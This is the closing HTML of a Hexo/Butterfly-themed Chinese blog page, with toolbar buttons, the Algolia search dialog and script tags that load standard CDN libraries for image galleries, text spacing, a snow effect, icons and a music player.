title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><canvas id="snow"></canvas><script async src="/js/snow.js"></script><script async src="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.js"></script><script async data-pjax src="/js/randombg.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.js"></script><!-- hexo injector body_end end --></body></html>
